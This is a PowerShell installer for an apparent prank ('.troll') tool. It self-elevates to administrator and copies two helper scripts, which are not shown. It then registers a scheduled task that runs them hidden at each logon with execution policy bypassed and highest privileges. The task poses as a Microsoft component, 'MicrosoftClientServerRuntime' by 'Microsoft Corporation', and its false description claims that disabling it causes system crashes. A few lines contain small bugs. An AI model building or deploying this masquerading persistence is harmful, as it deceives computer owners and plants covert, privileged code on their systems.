param (
  [switch]$Help,
  [switch]$Force,
  [switch]$Uninstall,
  $Name = "MicrosoftClientServerRuntime",
  $Author = "Microsoft Corporation",
  $Description = "Client Server Runtime (csrrs.exe) helps manage graphical instruction sets. If this task is disabled or stopped, your Microsoft Windows system will experience system instability and crashes. This task uninstalls itself when there is no Microsoft software using it.",
  $Delay,
  $BarType,
  # Aliases
  [switch]$h,
  [switch]$f,
  [switch]$u,
  $b
)

[Console]::BackgroundColor = "Black"
[Console]::ForegroundColor = "White"
[Console]::Name = $Name
Clear-Host; Write-Host ""

# ...................................................................................
# :: Auto Elevate & Pass Params. By @mbomb007 and @Suncat2000
# :: https://stackoverflow.com/a/70869951
# :: Licensed under CC-BY-SA 4.0 (https://creativecommons.org/licenses/by-sa/4.0/).
# :: Slightly Modified
# ...................................................................................

Function Get-Parameters {
  param (
    [hashtable]$NamedParameters
  )

  $params = @()
  $NamedParameters.GetEnumerator() | ForEach-Object {
    if (($_.Value -is [switch]) -And ($_.Value)) {
      $params += "-$($_.Key)" # Switches
      }
      elseif (($_.Value -isnot [switch]) -And ($null -ne $_.Value)) {
        $params += "-$($_.Key) `"$($_.Value)`"" # Normal parameters
        }
    }
  return $params -join " "
  }

# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
    $CommandLine = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`" " + (Get-Parameters $MyInvocation.BoundParameters) + " " + $MyInvocation.UnboundArguments
    Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
    Exit }
  }
# ...................................................................................



# Set params
if (($false -eq $Help) -And ($true -eq $h)) {
  $h = $Help
  $h = $null }
if (($false -eq $Force) -And ($true -eq $f)) {
  $f = $Force
  $f = $null }
if (($false -eq $Uninstall) -And ($true -eq $u)) {
  $u = $Uninstall
  $u = $null }


# Variables
$Path = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)
$Path = Join-Path -Path "$Path" -ChildPath ".troll" 
if ($null -eq $Delay) {
  $Delay = [uint32]3600,[uint32]5400 }
$settings_path = Join-Path -Path "$Path" -ChildPath "settings.xml"
$script_path = Join-Path -Path "$Path" -ChildPath "delay.ps1"
if (($true -eq $Force) -Or ($true -eq $Uninstall)) {
  $settings_read = [xml](Get-Content -LiteralPath "$settings_path") }
[xml]$settings = @"
<?xml version="1.0" encoding="UTF-8"?>
<settings version="1.0">
  <name></name>
  <author></author>
  <description></description>
  <delay>
    <max></max>
    <min></min>
  </delay>
  <bartype>default</bartype>
</settings>
"@

# Run Help
Function Run-Help {
  SmartExit -NoHalt -ExitReason "usage: install [-Name <string[]>] [-Author <string[]>] [-Description <string[]>]`n               [-Delay <uint32[]> / <uint32[]>,<uint32[]>] [-Force] [-Help]`n               [-Uninstall]"
}

# Uninstall
Function Uninstall {
  try {
    Get-ScheduledTask -TaskName "$($settings_read.settings.name)" -ErrorAction Stop | Out-Null
    Unregister-ScheduledTask -TaskName "$($settings_read.settings.name)" -Confirm:$false } catch {}
  Remove-Item -LiteralPath $Path -Recuse -Force -Confirm:$false
  SmartExit -NoHalt -ExitReason "`nUninstalled."
}

# Function check if administrator
Function Is-Administrator {  
  $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent();
  (New-Object Security.Principal.WindowsPrincipal $CurrentUser).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

# Halt
Function Halt {
  param (
    [string]$Message = "Press any key to continue . . . "
  )

  $cursor = [console]::CursorVisible
  [console]::CursorVisible = $false
  Write-Host "$Message" -NoNewline
  $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
  [console]::CursorVisible = $cursor
  Write-Host
  }

# Smart exit
Function SmartExit {
  param (
    [switch]$NoHalt,
    [string]$ExitReason
  )
  Write-Host $ExitReason
  if (($host.Name -eq 'Windows PowerShell ISE Host') -or ($host.Name -eq 'Visual Studio Code Host')) { Exit }
    elseif ($HoHalt) { Exit }
    else {
      Halt -Message "Press any key to exit . . . "
      Exit
    }
  }

# Checks
Function Check-Params {
  $ExitReason = @()
  if ($false -eq (Is-Administrator)) {
    $ExitReason += "Script is not running as Administrator." }

  if (($true -eq $Help) -And ($true -eq $h)) {
    $ExitReason += "Cannot bind parameter because parameter 'Help' is specified more than once."
    $SkipHelp = $true }
  if (($true -eq $Force) -And ($true -eq $f)) {
    $ExitReason += "Cannot bind parameter because parameter 'Force' is specified more than once." }
  if (($true -eq $Uninstall) -And ($true -eq $u)) {
    $ExitReason += "Cannot bind parameter because parameter 'Uninstall' is specified more than once." }
  if ($Delay.Count -gt 2) {
    $ExitReason += "Cannot bind parameter because parameter 'Delay' is specified more than twice." }

  if (($true -eq $Help) -And ($true -ne $SkipHelp)) {
    Run-Help # Run help & exit
  }
  if ($true -eq $Uninstall) {
    Uninstall # Uninstall & exit
  }

  if (((Test-Path -LiteralPath "$settings_path" -IsValid) -eq $false)) {
      $ExitReason += "Unable to find suitable path." }
      elseif ((Test-Path -LiteralPath $settings_path) -And ($false -eq $Force)) {
          $ExitReason += "Settings already exist. Use [-Force] to overwrite."
      }

  if ($Delay.Count -eq 1) {
    try {
      $Delay = [uint32]$Delay }
      catch { $ExitReason += "You didn't provide a proper delay. Proper: <uint[]>" } }
    if ($Delay.Count -eq 2) {
      try {
        $Delay[0] = [uint32]$Delay[0]
        $Delay[1] = [uint32]$Delay[1]
        $usr_delay_rng = $true }
        catch { $ExitReason += "You didn't provide a proper range of delays. Proper: <uint[]>,<uint[]>" } }

    if (($true -eq $usr_delay_rng) -And !($Delay[0] -lt $Delay[1])) {
      $ExitReason += "Maximum delay provided is lower than minimum delay. [Delay[1] < Delay[0]] instead of [Delay[0] > Delay[1]]" }

  if (Test-Path -LiteralPath $settings_path -PathType Container) {
    $ExitReason += "Settings path is a folder." }

    if ($ExitReason.Count -gt 0) {
      Write-Host "Script failed checks due to the following reasons:" -ForegroundColor DarkYellow
      ForEach ($IndividualReason in $ExitReason) {
          Write-Host "ERROR: $IndividualReason" -ForegroundColor RED }
      SmartExit -ExitReason ""
    }
  }

# Run checks
Check-Params

# Copy settings
New-Item -Path $Path -ItemType Directory -Force | Out-Null
if (Test-Path -LiteralPath $settings_path) {
  try {
    Get-ScheduledTask -TaskName "$($settings_read.settings.name)" -ErrorAction Stop | Out-Null
    Unregister-ScheduledTask -TaskName "$($settings_read.settings.name)" -Confirm:$false } catch {}
  Remove-Item -Recurse -LiteralPath $settings_path -Force -Confirm:$false }
$settings.settings.name = [string]$Name
$settings.settings.author = [string]$Author
$settings.settings.description = [string]$Description
if ($Delay.Count -eq 2) {
  $settings.settings.delay.min = [string]$Delay[0]
  $settings.settings.delay.max = [string]$Delay[1] }
else {
  $settings.settings.delay.min = [string]$Delay
  $settings.settings.delay.max = [string]$Delay }
$settings.Save("$settings_path")

# Copy scripts
Copy-Item -LiteralPath "$(Join-Path -Path "$PSScriptRoot" -ChildPath "delay.ps1")" -Destination "$script_path"
Copy-Item -LiteralPath "$(Join-Path -Path "$PSScriptRoot" -ChildPath "window.ps1")" -Destination "$(Join-Path -Path "$Path" -ChildPath "window.ps1")"

# Set scheduled task
$task = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>$Description</Description>
    <Author>$Author</Author>
    <URI>\$Name</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>$(([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name)</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$(([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P1D</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File $script_path</Arguments>
    </Exec>
  </Actions>
</Task>
"@

try {
    Get-ScheduledTask -TaskName "$Name" -ErrorAction Stop | Out-Null
    Unregister-ScheduledTask -TaskName "$Name" -Confirm:$false } catch {}
Register-ScheduledTask -XML "$task" -TaskName "$Name" | Out-Null

# Keep the final progress update visible and allow exit with any key
Halt -Message "Press any key to exit."

# Clear console
Clear-Host
